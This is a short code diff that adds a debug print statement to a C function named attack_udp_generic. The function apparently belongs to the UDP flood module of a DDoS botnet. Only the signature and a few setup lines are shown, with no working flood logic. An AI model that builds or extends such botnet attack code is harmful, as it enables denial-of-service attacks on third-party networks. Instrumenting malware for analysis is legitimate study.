@@ -24,6 +24,7 @@ static ipv4_t get_dns_resolver(void);
 
 void attack_udp_generic(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
 {
+	printf("[invoked] attack_udp_generic, target length: %d\n", targs_len);
     int i, fd;
     char **pkts = calloc(targs_len, sizeof (char *));
     uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
